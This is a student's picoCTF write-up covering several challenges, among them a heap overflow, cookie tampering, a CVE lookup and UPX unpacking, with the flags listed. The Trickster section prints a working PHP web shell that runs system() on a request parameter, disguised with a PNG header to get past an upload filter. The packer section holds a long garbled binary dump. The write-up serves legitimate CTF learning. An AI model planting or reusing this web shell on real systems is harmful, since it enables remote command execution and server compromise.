# login(Web Exploitation)
## flag
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}

Step 1:
This question was honestly very basic just went to the website and tried to inspect it and the page source.
Firstly didnt find anything so tried burpsuite, didnt find anything there as well.
Went back to the inspect element and tried to see the js code written, there I found a code and found an encoded base64 string which I decided to decode and got the flag.
![image](https://github.com/user-attachments/assets/48051a73-999a-45b3-a8f4-560249fd6d70)

Learnings:
No new learnings


No References.

## heap 1 (Binary Exploitation)

Flag
~~~
bash
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Step 1:
In this challenge, just like heap 0, I opened the source code and the instance and this was just like heap 0.
But at first I didnt notice the difference between both and just tried what I did in heap 0 to obtain the flag.
Knowing that there would of course be some catch but still did it and it of course didnt work.
Step 2:
Went to the source code and carefully examined it.
That is when I saw it, the safe word shouldnt be pico or it wouldnt give me the flag.
Step 3:
So at first I entered all the alpha numeric characters to figure out which ones overflow to the safe var, once discovered that I entered such a string that would overflow pico to the safe var and give me the flag and it did.

![image](https://github.com/user-attachments/assets/f1dd9d56-e857-4663-931d-1f261ae7aea9)
![image](https://github.com/user-attachments/assets/144bccb4-0f7d-4d23-b4bd-1fc07cb58597)


Code and Terminal Output
~~~
bash
 nc tethys.picoctf.net 51553

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyz123456pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   abcdefghijklmnopqrstuvwxyz123456pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Learnings:
A) nothing new learnt as such just a key takeaway to not straight dive into the question, instead taking a little time to read the source code and understand what the question actually requires.



# Power Cookie(Web Exploitation)
## flag
picoCTF{gr4d3_A_c00k13_0d351e23}

Step 1: This one as well was very basic, just inspected the website found a js code which had isAdmin=0 which meant that I was a guest hence I made isAdmin=1 which gave me admin access hence I logged in and got the flag.
![image](https://github.com/user-attachments/assets/23d6dfc0-b24b-4fc8-89a8-de14ca321aa5)


![image](https://github.com/user-attachments/assets/2a6eb9b4-9419-44d7-a953-20ef8b0998c3)

# CVE-XXXX-XXXX
## flag
picoCTF{CVE-2021-34527}

Step 1:
Just researched the given info which was given in the question and literally recieved all the data on it on this website(in the references).
![image](https://github.com/user-attachments/assets/217c3cf6-e6fd-41ba-9478-eaf395b0cd0a)

Learnings:
A) learnt about the vulnerability in the windows print spooler service(in 2021) in which a hacker had full rights to the system.

References:
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=windows+print+spooler

# Ascii Numbers(General Skills)
## flag
picoCTF{45c11_n0_qu35710n5_1ll_t311_y3_n0_l135_445d4180}

Step 1:
Nothing as such to do in this challenge, just to convert string of hexadecimal characters to ascii readable text.

No learnings.

References:
cyber chef

# Trickster(web exp)
## Flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}

Step 1:
Was given a website, on which visiting I saw that the website takes png files as uploads.
In the website I started to upload a random png file and uploaded it and saw that it did nothing only that it accepted if the file type was png otherwise it gave an error.
Step 2:
Now thanks to advent of cyber, I knew that when there were file uploads, a php webshell could be created to make an executable web shell on the website which can be used to access files uploaded on the website.
So I searched on google how to make an executable webshell which I saved. The code was as follows:
~~~
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
~~~
The png at the start has been added to disguise the webshell as png file.
I renamed the file and saved it as html.png.php
Step 3:
I uploaded the file and visited the /uploads URL which gave me this:
![image](https://github.com/user-attachments/assets/2e7fcd01-6a27-450d-a82a-11d6f529c83d)

Once here, I decided to execute ls -al /var/www/html to find all the files in that directory.

![image](https://github.com/user-attachments/assets/8f3170b1-6895-4769-969e-b3eae236e983)

Then I decided to cat the GAZWIMLEGU2DQ.txt file and it gave me the flag.

![image](https://github.com/user-attachments/assets/60d843ae-73c7-4c07-ac12-87a04bc20d4b)


# packer(rev eng)
## Flag:
picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_1a5a3f39}

Step 1:
Was given a file which I installed on the terminal using wget.
On doing file out:
I got to know that this was an ELF file, didnt know what an elf file was so used chatgpt to get to more info on an elf file and got to know that its basically an executable file type which is used to store data.
Tried to both cat and execute the file which were both useless as the file included alot of data which was impossible to go through, and when executed it required a password which wasnt really obtainable.

~~~
��r�����p�/_�(�[�^Gb �o#�'B=rgv�ekpos�!0
�eB�qJE#���1rol?�N��ibU�ƛ�f�"nQ���n"L���Lţ1;n�=l10�e%�1␦,f}-Iso��J5ׯX,���S)�␦A6adn��"0��cD8"�A� ��mb1   [n�� Ta+T��*�1� �n��sNP(,:Zu��S7�vw10<1�e)��Z,��(,-?��j]�O��ԦT)����H��E����-de16!p)�;QS�!��q!file�CW�w^p��ņn.��D�y`g�}��P�.�2��Aľ�@
Uv֍P=')Z��GI_grO�T����. ��@e�                                                                            D�Rr��ڄC�M�hib�h�itQ�0A
                             �C�C�_f�a��"�C��� �lod]��Ja���TX�auLu�n��r��P`=ٳ�Q���@(\������uU-eU����$ja�.a��O��!Sk-w����cm&v5a  ~
rt�U_W��a¥'[gƓZO�dl �a��u��
s#pR*�� �
0h�k%�耙e���P�嘅A��âU3���py��!w�z�_��g��dup�8�gaps�!z�0Q�F@�__7�X�{�wShUX=��b
.P�ruÉ#�CS���X8&@2�R�ok�pt�P
�usiz�TH�l�Qs,v7f��/Dbsf���!
��g�ZM�81�DQ�'â !*�BA�!s�W�-1␦�p�mQH�-� #`��ɃB�zTVcwc�ӊ��B��I%#W��#��M]�Ա���c0�BcY
 0���_n�sD�G��cgui0)                                                  *#YZ@*��W��=�d�inKiX���1�QߵG�Ro�E��U�%��42%�p
x64�c0i�m��     %�v�����T�{Iy�F��UݤB`T��`Fnc�6��J�$ce�� �l(0BhKCo�3�uIOEB�}�D!�"Spco�J�dl�r�+!!N_s��8�9\r�sN!��n+]R��@��_�@x�wdb�p␦8��c����@����J�mat��� d+��D��k�� ��!ozC
R5G�dls�S��P�m&     <�
a��p�0� ��`����`Ѡ�b�_5B!˹�xBb�3�d*�K�x�-KinF�1��ј1�v�P);�԰�R���b@`��R`
���"l�Vl��F�csl�fa�#dl�E1"$ҥ�v�'o��º��c�*���    �8��p" 0h�'��H(��g�era�Wa%�#�->�#sem�b4�ř��5mun�\T_� �A_�h�'� ɐ��akt��8�)ibU�B�dl.
�/Ixc�teƚGe�3�����X!��D�E�}MVa��K
8�c64eP�who�g��9�at8V<�ddr%�H1hP)�t��q�C��)��g0����x%_re�Yk�-�0y��Έ��OR�ed���*�װ�1b��pl��p��me�
k�      ?|aT�QV�(                                                                               ���P�
                 ���"0��J                                                                            'PO��6�SIX=ZC�;�"Q]i��[    �'
pB͑�$��W�6�W�#�R%�c))�5�y�␦�f�J8�-1dl�H��71���_�#�@���-�;�_)�Ģ�+%J<�=��B���r�H!t*uds30j(Em�m�t��D�nnum:3�:tb
c��w��E�En�Z���?�oB!�{��E��4
��{                         '"�Q8���4␦�l�G��H�
�uk�8a��TL���t���toÁ�/\�vinit�ZH'BaPa         { p�8b��պy�kPB�S�'$��Q�
��Us�oj1�hο_sa#\À.b0.a`�}h�kěZ4u.��y%�݂Z/-id%ABI-�`"�␦<>4�^�..B�4�CY␦�Ƃ.��Dx�Zo��-�.eh��ccU����?�a8s,���s�m�n`I C�Q8���ot       +da$�&�W�|��-�.bssh� �(�.^�
R�Em�b�F�U�9�l�U���j1t�
_a�l��Ѹ?p! ���].��!$�]�b_AC[�����O���n'B���i/�@W�ÞwYI@�Z␦?�TM���  �_����_���$O  e��g�1Io�w�Y䅴M
}1�m��PIl�b��"��        �T�R��VqBasw�n�~err�    Շ0��64qCcTOls,�����#�*Y�9�8p�N�hC��
�����[�m��][`4v@K[e�Q%wEn�F���P_g{�␦�Xq�E���x���wc����VH�-s#�5W�K`�x����_��1"umb0)P���b4�L�08-�%��GVJ�b��7��3�j,LVgu�S,�        cD
ٿ�Er�'lk]��lu�.* 4�a}�bG[�p%��p��_�"/6�w�a$B���rF       C�VBMfE�C�U     ӿt4�=/jf�P�ŀ5IO�nK�i2�4��P*�_�nv���@�噣�P`UI����(˃1�kE��LO
CALE�:ٍ��n�+-'1}e�Euid����A�[(ed)/PW!sx�܆���_��'�Ţ61O���ToOIO7f!�z�fd�.
m@���'"99��@���] �����������A�������-���������F�_��v������b�          ������1��5��A�;}���B}p��q_=dl��w��.b���ƂC�%�P:�L]��b�s�
                                                             d������0␦4                                                       ��pM
ž���xfwnl��mi��]�e�oseC߁0IO_␦�5@C�K�F-�4n�3lbf�`{~m�W�*Gb�5�J�iR�YDF
!)T:H_db��`�%��`�_�Cai���C
�w      X� �dl= 9�E��"Uń1��'���`ؿ"8_y��%�,X9
I␦�saps@LAPTOP-KKUS7K8J:~$ 61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c^C                  �(Yǉ�<T�UPP��
saps@LAPTOP-KKUS7K8J:~$ ~/out
Enter the password to unlock this file: ^C
~~~


Step 2:
Then I read the hint which said that the file was needed to be decompressed, but I didnt know how the file was exactly packed.
Using the binwalk command I got to know that it was an UPX packed file.

Step 3:
didnt know how to decompress these type of packed files so searched and got to know.
run the following command.
~~~
upx-ucl out
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx-ucl: out: AlreadyPackedException

Packed 0 files.
saps@LAPTOP-KKUS7K8J:~$ upx -d out
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    872088 <-    336520   38.59%   linux/amd64   out

Unpacked 1 file.
~~~

got to know -d argument has to be used to unpack.
When that was done i catted the file and alot of data was still included so I decided to grep flag which gave me this(thanks to bandit):
~~~
saps@LAPTOP-KKUS7K8J:~$ strings out | grep flag
Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f31613561336633397d
(mode_flags & PRINTF_FORTIFY) != 0
WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.
version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)
flag.c
_dl_x86_hwcap_flags
_dl_stack_flags
~~~
and this was the flag in hexadecimal which when converted gave me the flag.

Learnings:
1) Got to know how to decompress UPX files.

References:
1)https://www.kali.org/tools/upx-ucl/
2) https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NzA2OTYzNmY0MzU0NDY3YjU1Mzk1ODVmNTU2ZTUwMzQ2MzZiMzE0ZTM2NWY0MjMxNmUzNDUyNjkzMzUzNWYzMTYxMzU2MTMzNjYzMzM5N2Q





